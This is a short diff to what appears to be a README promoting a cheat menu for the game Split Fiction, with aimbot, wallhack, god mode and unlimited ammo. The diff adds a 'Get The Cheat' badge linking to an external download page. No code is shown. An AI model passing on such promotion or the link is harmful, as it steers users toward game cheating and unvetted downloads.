@@ -4,6 +4,7 @@
 
 **Split Fiction** is packed with fast-paced action and tactical gameplay, but sometimes you want more than just raw skill. That’s where the **Split Fiction cheat menu** comes in. With hacks like aimbot, ESP wallhack, god mode, and unlimited ammo, you can control every battle and take your gameplay to the next level.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://split-fiction-cheats.github.io/.github/)
 ---
 
 ## Product Description
